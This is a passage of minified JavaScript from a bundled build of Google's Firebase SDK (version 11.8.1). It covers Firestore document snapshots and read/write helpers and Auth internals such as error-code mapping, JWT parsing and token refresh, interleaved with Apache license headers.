 */class id{constructor(e,n){this.hasPendingWrites=e,this.fromCache=n}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class g4 extends h4{constructor(e,n,i,s,o,c){super(e,n,i,s,c),this._firestore=e,this._firestoreImpl=e,this.metadata=o}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const n=new Ff(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(n,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,n={}){if(this._document){const i=this._document.data.field(f4("DocumentSnapshot.get",e));if(i!==null)return this._userDataWriter.convertValue(i,n.serverTimestamps)}}}class Ff extends g4{data(e={}){return super.data(e)}}class y4{constructor(e,n,i,s){this._firestore=e,this._userDataWriter=n,this._snapshot=s,this.metadata=new id(s.hasPendingWrites,s.fromCache),this.query=i}get docs(){const e=[];return this.forEach(n=>e.push(n)),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,n){this._snapshot.docs.forEach(i=>{e.call(n,new Ff(this._firestore,this._userDataWriter,i.key,i,new id(this._snapshot.mutatedKeys.has(i.key),this._snapshot.fromCache),this.query.converter))})}docChanges(e={}){const n=!!e.includeMetadataChanges;if(n&&this._snapshot.excludesMetadataChanges)throw new ke(fe.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===n||(this._cachedChanges=function(s,o){if(s._snapshot.oldDocs.isEmpty()){let c=0;return s._snapshot.docChanges.map(d=>{const f=new Ff(s._firestore,s._userDataWriter,d.doc.key,d.doc,new id(s._snapshot.mutatedKeys.has(d.doc.key),s._snapshot.fromCache),s.query.converter);return d.doc,{type:"added",doc:f,oldIndex:-1,newIndex:c++}})}{let c=s._snapshot.oldDocs;return s._snapshot.docChanges.filter(d=>o||d.type!==3).map(d=>{const f=new Ff(s._firestore,s._userDataWriter,d.doc.key,d.doc,new id(s._snapshot.mutatedKeys.has(d.doc.key),s._snapshot.fromCache),s.query.converter);let p=-1,v=-1;return d.type!==0&&(p=c.indexOf(d.doc.key),c=c.delete(d.doc.key)),d.type!==1&&(c=c.add(d.doc),v=c.indexOf(d.doc.key)),{type:Dj(d.type),doc:f,oldIndex:p,newIndex:v}})}}(this,n),this._cachedChangesIncludeMetadataChanges=n),this._cachedChanges}}function Dj(t){switch(t){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return ze(61501,{type:t})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zs(t){t=wi(t,ai);const e=wi(t.firestore,Bs);return vj(_p(e),t._key).then(n=>_4(e,t,n))}class j_ extends kj{constructor(e){super(),this.firestore=e}convertBytes(e){return new bc(e)}convertReference(e){const n=this.convertDocumentKey(e,this.firestore._databaseId);return new ai(this.firestore,null,n)}}function L_(t){t=wi(t,Wd);const e=wi(t.firestore,Bs),n=_p(e),i=new j_(e);return m4(t._query),_j(n,t._query).then(s=>new y4(e,i,t,s))}function v4(t,e,n){t=wi(t,ai);const i=wi(t.firestore,Bs),s=p4(t.converter,e);return Ep(i,[l4(D_(i),"setDoc",t._key,s,t.converter!==null,n).toMutation(t._key,ar.none())])}function Cm(t,e,n,...i){t=wi(t,ai);const s=wi(t.firestore,Bs),o=D_(s);let c;return c=typeof(e=tn(e))=="string"||e instanceof wp?Nj(o,"updateDoc",t._key,e,n,i):Sj(o,"updateDoc",t._key,e),Ep(s,[c.toMutation(t._key,ar.exists(!0))])}function Mj(t){return Ep(wi(t.firestore,Bs),[new o_(t._key,ar.none())])}function Oj(t,e){const n=wi(t.firestore,Bs),i=gi(t),s=p4(t.converter,e);return Ep(n,[l4(D_(t.firestore),"addDoc",i._key,s,t.converter!==null,{}).toMutation(i._key,ar.exists(!1))]).then(()=>i)}function Pj(t,...e){var n,i,s;t=tn(t);let o={includeMetadataChanges:!1,source:"default"},c=0;typeof e[c]!="object"||WA(e[c])||(o=e[c],c++);const d={includeMetadataChanges:o.includeMetadataChanges,source:o.source};if(WA(e[c])){const b=e[c];e[c]=(n=b.next)===null||n===void 0?void 0:n.bind(b),e[c+1]=(i=b.error)===null||i===void 0?void 0:i.bind(b),e[c+2]=(s=b.complete)===null||s===void 0?void 0:s.bind(b)}let f,p,v;if(t instanceof ai)p=wi(t.firestore,Bs),v=cp(t._key.path),f={next:b=>{e[c]&&e[c](_4(p,t,b))},error:e[c+1],complete:e[c+2]};else{const b=wi(t,Wd);p=wi(b.firestore,Bs),v=b._query;const w=new j_(p);f={next:E=>{e[c]&&e[c](new y4(p,w,b,E))},error:e[c+1],complete:e[c+2]},m4(t._query)}return function(w,E,C,M){const V=new S_(M),B=new E_(E,V,C);return w.asyncQueue.enqueueAndForget(async()=>b_(await Em(w),B)),()=>{V.Cu(),w.asyncQueue.enqueueAndForget(async()=>x_(await Em(w),B))}}(_p(p),v,d,f)}function Ep(t,e){return function(i,s){const o=new Ps;return i.asyncQueue.enqueueAndForget(async()=>aj(await yj(i),s,o)),o.promise}(_p(t),e)}function _4(t,e,n){const i=n.docs.get(e._key),s=new j_(t);return new g4(t,s,e._key,i,new id(n.hasPendingWrites,n.fromCache),e.converter)}function jj(){return new M_("serverTimestamp")}(function(e,n=!0){(function(s){jc=s})(tl),Fo(new za("firestore",(i,{instanceIdentifier:s,options:o})=>{const c=i.getProvider("app").getImmediate(),d=new Bs(new NP(i.getProvider("auth-internal")),new kP(c,i.getProvider("app-check-internal")),function(p,v){if(!Object.prototype.hasOwnProperty.apply(p.options,["projectId"]))throw new ke(fe.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new bd(p.options.projectId,v)}(c,s),c);return o=Object.assign({useFetchStreams:n},o),d._setSettings(o),d},"PUBLIC").setMultipleInstances(!0)),Kr(Jx,eA,e),Kr(Jx,eA,"esm2017")})();var Lj="firebase",Vj="11.8.1";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */Kr(Lj,Vj,"app");function V_(t,e){var n={};for(var i in t)Object.prototype.hasOwnProperty.call(t,i)&&e.indexOf(i)<0&&(n[i]=t[i]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var s=0,i=Object.getOwnPropertySymbols(t);s<i.length;s++)e.indexOf(i[s])<0&&Object.prototype.propertyIsEnumerable.call(t,i[s])&&(n[i[s]]=t[i[s]]);return n}function w4(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const Uj=w4,b4=new qd("auth","Firebase",w4());/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Sm=new ip("@firebase/auth");function Bj(t,...e){Sm.logLevel<=ot.WARN&&Sm.warn(`Auth (${tl}): ${t}`,...e)}function Hf(t,...e){Sm.logLevel<=ot.ERROR&&Sm.error(`Auth (${tl}): ${t}`,...e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ts(t,...e){throw B_(t,...e)}function _r(t,...e){return B_(t,...e)}function U_(t,e,n){const i=Object.assign(Object.assign({},Uj()),{[e]:n});return new qd("auth","Firebase",i).create(e,{appName:t.name})}function Uo(t){return U_(t,"operation-not-supported-in-this-environment","Operations that alter the current user are not supported in conjunction with FirebaseServerApp")}function zj(t,e,n){const i=n;if(!(e instanceof i))throw i.name!==e.constructor.name&&ts(t,"argument-error"),U_(t,"argument-error",`Type of ${e.constructor.name} does not match expected instance.Did you pass a reference from a different Auth SDK?`)}function B_(t,...e){if(typeof t!="string"){const n=e[0],i=[...e.slice(1)];return i[0]&&(i[0].appName=t.name),t._errorFactory.create(n,...i)}return b4.create(t,...e)}function qe(t,e,...n){if(!t)throw B_(e,...n)}function ks(t){const e="INTERNAL ASSERTION FAILED: "+t;throw Hf(e),new Error(e)}function Fs(t,e){t||ks(e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function J0(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.href)||""}function Fj(){return $A()==="http:"||$A()==="https:"}function $A(){var t;return typeof self<"u"&&((t=self.location)===null||t===void 0?void 0:t.protocol)||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Hj(){return typeof navigator<"u"&&navigator&&"onLine"in navigator&&typeof navigator.onLine=="boolean"&&(Fj()||nO()||"connection"in navigator)?navigator.onLine:!0}function qj(){if(typeof navigator>"u")return null;const t=navigator;return t.languages&&t.languages[0]||t.language||null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $d{constructor(e,n){this.shortDelay=e,this.longDelay=n,Fs(n>e,"Short delay should be less than long delay!"),this.isMobile=Xv()||PC()}get(){return Hj()?this.isMobile?this.longDelay:this.shortDelay:Math.min(5e3,this.shortDelay)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function z_(t,e){Fs(t.emulator,"Emulator should always be set here");const{url:n}=t.emulator;return e?`${n}${e.startsWith("/")?e.slice(1):e}`:n}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class x4{static initialize(e,n,i){this.fetchImpl=e,n&&(this.headersImpl=n),i&&(this.responseImpl=i)}static fetch(){if(this.fetchImpl)return this.fetchImpl;if(typeof self<"u"&&"fetch"in self)return self.fetch;if(typeof globalThis<"u"&&globalThis.fetch)return globalThis.fetch;if(typeof fetch<"u")return fetch;ks("Could not find fetch implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static headers(){if(this.headersImpl)return this.headersImpl;if(typeof self<"u"&&"Headers"in self)return self.Headers;if(typeof globalThis<"u"&&globalThis.Headers)return globalThis.Headers;if(typeof Headers<"u")return Headers;ks("Could not find Headers implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}static response(){if(this.responseImpl)return this.responseImpl;if(typeof self<"u"&&"Response"in self)return self.Response;if(typeof globalThis<"u"&&globalThis.Response)return globalThis.Response;if(typeof Response<"u")return Response;ks("Could not find Response implementation, make sure you call FetchProvider.initialize() with an appropriate polyfill")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Gj={CREDENTIAL_MISMATCH:"custom-token-mismatch",MISSING_CUSTOM_TOKEN:"internal-error",INVALID_IDENTIFIER:"invalid-email",MISSING_CONTINUE_URI:"internal-error",INVALID_PASSWORD:"wrong-password",MISSING_PASSWORD:"missing-password",INVALID_LOGIN_CREDENTIALS:"invalid-credential",EMAIL_EXISTS:"email-already-in-use",PASSWORD_LOGIN_DISABLED:"operation-not-allowed",INVALID_IDP_RESPONSE:"invalid-credential",INVALID_PENDING_TOKEN:"invalid-credential",FEDERATED_USER_ID_ALREADY_LINKED:"credential-already-in-use",MISSING_REQ_TYPE:"internal-error",EMAIL_NOT_FOUND:"user-not-found",RESET_PASSWORD_EXCEED_LIMIT:"too-many-requests",EXPIRED_OOB_CODE:"expired-action-code",INVALID_OOB_CODE:"invalid-action-code",MISSING_OOB_CODE:"internal-error",CREDENTIAL_TOO_OLD_LOGIN_AGAIN:"requires-recent-login",INVALID_ID_TOKEN:"invalid-user-token",TOKEN_EXPIRED:"user-token-expired",USER_NOT_FOUND:"user-token-expired",TOO_MANY_ATTEMPTS_TRY_LATER:"too-many-requests",PASSWORD_DOES_NOT_MEET_REQUIREMENTS:"password-does-not-meet-requirements",INVALID_CODE:"invalid-verification-code",INVALID_SESSION_INFO:"invalid-verification-id",INVALID_TEMPORARY_PROOF:"invalid-credential",MISSING_SESSION_INFO:"missing-verification-id",SESSION_EXPIRED:"code-expired",MISSING_ANDROID_PACKAGE_NAME:"missing-android-pkg-name",UNAUTHORIZED_DOMAIN:"unauthorized-continue-uri",INVALID_OAUTH_CLIENT_ID:"invalid-oauth-client-id",ADMIN_ONLY_OPERATION:"admin-restricted-operation",INVALID_MFA_PENDING_CREDENTIAL:"invalid-multi-factor-session",MFA_ENROLLMENT_NOT_FOUND:"multi-factor-info-not-found",MISSING_MFA_ENROLLMENT_ID:"missing-multi-factor-info",MISSING_MFA_PENDING_CREDENTIAL:"missing-multi-factor-session",SECOND_FACTOR_EXISTS:"second-factor-already-in-use",SECOND_FACTOR_LIMIT_EXCEEDED:"maximum-second-factor-count-exceeded",BLOCKING_FUNCTION_ERROR_RESPONSE:"internal-error",RECAPTCHA_NOT_ENABLED:"recaptcha-not-enabled",MISSING_RECAPTCHA_TOKEN:"missing-recaptcha-token",INVALID_RECAPTCHA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Yj=["/v1/accounts:signInWithCustomToken","/v1/accounts:signInWithEmailLink","/v1/accounts:signInWithIdp","/v1/accounts:signInWithPassword","/v1/accounts:signInWithPhoneNumber","/v1/token"],Qj=new $d(3e4,6e4);function F_(t,e){return t.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:t.tenantId}):e}async function Bc(t,e,n,i,s={}){return A4(t,s,async()=>{let o={},c={};i&&(e==="GET"?c=i:o={body:JSON.stringify(i)});const d=Pc(Object.assign({key:t.config.apiKey},c)).slice(1),f=await t._getAdditionalHeaders();f["Content-Type"]="application/json",t.languageCode&&(f["X-Firebase-Locale"]=t.languageCode);const p=Object.assign({method:e,headers:f},o);return tO()||(p.referrerPolicy="no-referrer"),t.emulatorConfig&&el(t.emulatorConfig.host)&&(p.credentials="include"),x4.fetch()(await E4(t,t.config.apiHost,n,d),p)})}async function A4(t,e,n){t._canInitEmulator=!1;const i=Object.assign(Object.assign({},Gj),e);try{const s=new Wj(t),o=await Promise.race([n(),s.promise]);s.clearNetworkTimeout();const c=await o.json();if("needConfirmation"in c)throw Rf(t,"account-exists-with-different-credential",c);if(o.ok&&!("errorMessage"in c))return c;{const d=o.ok?c.errorMessage:c.error.message,[f,p]=d.split(" : ");if(f==="FEDERATED_USER_ID_ALREADY_LINKED")throw Rf(t,"credential-already-in-use",c);if(f==="EMAIL_EXISTS")throw Rf(t,"email-already-in-use",c);if(f==="USER_DISABLED")throw Rf(t,"user-disabled",c);const v=i[f]||f.toLowerCase().replace(/[_\s]+/g,"-");if(p)throw U_(t,v,p);ts(t,v)}}catch(s){if(s instanceof Gs)throw s;ts(t,"network-request-failed",{message:String(s)})}}async function Kj(t,e,n,i,s={}){const o=await Bc(t,e,n,i,s);return"mfaPendingCredential"in o&&ts(t,"multi-factor-auth-required",{_serverResponse:o}),o}async function E4(t,e,n,i){const s=`${e}${n}?${i}`,o=t,c=o.config.emulator?z_(t.config,s):`${t.config.apiScheme}://${s}`;return Yj.includes(n)&&(await o._persistenceManagerAvailable,o._getPersistenceType()==="COOKIE")?o._getPersistence()._getFinalTarget(c).toString():c}class Wj{clearNetworkTimeout(){clearTimeout(this.timer)}constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((n,i)=>{this.timer=setTimeout(()=>i(_r(this.auth,"network-request-failed")),Qj.get())})}}function Rf(t,e,n){const i={appName:t.name};n.email&&(i.email=n.email),n.phoneNumber&&(i.phoneNumber=n.phoneNumber);const s=_r(t,e,i);return s.customData._tokenResponse=n,s}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function $j(t,e){return Bc(t,"POST","/v1/accounts:delete",e)}async function Nm(t,e){return Bc(t,"POST","/v1/accounts:lookup",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function cd(t){if(t)try{const e=new Date(Number(t));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}async function Xj(t,e=!1){const n=tn(t),i=await n.getIdToken(e),s=H_(i);qe(s&&s.exp&&s.auth_time&&s.iat,n.auth,"internal-error");const o=typeof s.firebase=="object"?s.firebase:void 0,c=o==null?void 0:o.sign_in_provider;return{claims:s,token:i,authTime:cd(u0(s.auth_time)),issuedAtTime:cd(u0(s.iat)),expirationTime:cd(u0(s.exp)),signInProvider:c||null,signInSecondFactor:(o==null?void 0:o.sign_in_second_factor)||null}}function u0(t){return Number(t)*1e3}function H_(t){const[e,n,i]=t.split(".");if(e===void 0||n===void 0||i===void 0)return Hf("JWT malformed, contained fewer than 3 sections"),null;try{const s=dm(n);return s?JSON.parse(s):(Hf("Failed to decode base64 JWT payload"),null)}catch(s){return Hf("Caught error parsing JWT payload as JSON",s==null?void 0:s.toString()),null}}function XA(t){const e=H_(t);return qe(e,"internal-error"),qe(typeof e.exp<"u","internal-error"),qe(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Cd(t,e,n=!1){if(n)return e;try{return await e}catch(i){throw i instanceof Gs&&Zj(i)&&t.auth.currentUser===t&&await t.auth.signOut(),i}}function Zj({code:t}){return t==="auth/user-disabled"||t==="auth/user-token-expired"}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jj{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var n;if(e){const i=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),i}else{this.errorBackoff=3e4;const s=((n=this.user.stsTokenManager.expirationTime)!==null&&n!==void 0?n:0)-Date.now()-3e5;return Math.max(0,s)}}schedule(e=!1){if(!this.isRunning)return;const n=this.getInterval(e);this.timerId=setTimeout(async()=>{await this.iteration()},n)}async iteration(){try{await this.user.getIdToken(!0)}catch(e){(e==null?void 0:e.code)==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ev{constructor(e,n){this.createdAt=e,this.lastLoginAt=n,this._initializeTime()}_initializeTime(){this.lastSignInTime=cd(this.lastLoginAt),this.creationTime=cd(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Rm(t){var e;const n=t.auth,i=await t.getIdToken(),s=await Cd(t,Nm(n,{idToken:i}));qe(s==null?void 0:s.users.length,n,"internal-error");const o=s.users[0];t._notifyReloadListener(o);const c=!((e=o.providerUserInfo)===null||e===void 0)&&e.length?T4(o.providerUserInfo):[],d=tL(t.providerData,c),f=t.isAnonymous,p=!(t.email&&o.passwordHash)&&!(d!=null&&d.length),v=f?p:!1,b={uid:o.localId,displayName:o.displayName||null,photoURL:o.photoUrl||null,email:o.email||null,emailVerified:o.emailVerified||!1,phoneNumber:o.phoneNumber||null,tenantId:o.tenantId||null,providerData:d,metadata:new ev(o.createdAt,o.lastLoginAt),isAnonymous:v};Object.assign(t,b)}async function eL(t){const e=tn(t);await Rm(e),await e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)}function tL(t,e){return[...t.filter(i=>!e.some(s=>s.providerId===i.providerId)),...e]}function T4(t){return t.map(e=>{var{providerId:n}=e,i=V_(e,["providerId"]);return{providerId:n,uid:i.rawId||"",displayName:i.displayName||null,email:i.email||null,phoneNumber:i.phoneNumber||null,photoURL:i.photoUrl||null}})}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function nL(t,e){const n=await A4(t,{},async()=>{const i=Pc({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:s,apiKey:o}=t.config,c=await E4(t,s,"/v1/token",`key=${o}`),d=await t._getAdditionalHeaders();return d["Content-Type"]="application/x-www-form-urlencoded",x4.fetch()(c,{method:"POST",headers:d,body:i})});return{accessToken:n.access_token,expiresIn:n.expires_in,refreshToken:n.refresh_token}}async function iL(t,e){return Bc(t,"POST","/v2/accounts:revokeToken",F_(t,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ic{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){qe(e.idToken,"internal-error"),qe(typeof e.idToken<"u","internal-error"),qe(typeof e.refreshToken<"u","internal-error");const n="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):XA(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,n)}updateFromIdToken(e){qe(e.length!==0,"internal-error");const n=XA(e);this.updateTokensAndExpiration(e,null,n)}async getToken(e,n=!1){return!n&&this.accessToken&&!this.isExpired?this.accessToken:(qe(this.refreshToken,e,"user-token-expired"),this.refreshToken?(await this.refresh(e,this.refreshToken),this.accessToken):null)}clearRefreshToken(){this.refreshToken=null}async refresh(e,n){const{accessToken:i,refreshToken:s,expiresIn:o}=await nL(e,n);this.updateTokensAndExpiration(i,s,Number(o))}updateTokensAndExpiration(e,n,i){this.refreshToken=n||null,this.accessToken=e||null,this.expirationTime=Date.now()+i*1e3}static fromJSON(e,n){const{refreshToken:i,accessToken:s,expirationTime:o}=n,c=new ic;return i&&(qe(typeof i=="string","internal-error",{appName:e}),c.refreshToken=i),s&&(qe(typeof s=="string","internal-error",{appName:e}),c.accessToken=s),o&&(qe(typeof o=="number","internal-error",{appName:e}),c.expirationTime=o),c}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new ic,this.toJSON())}_performRefresh(){return ks("not implemented")}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
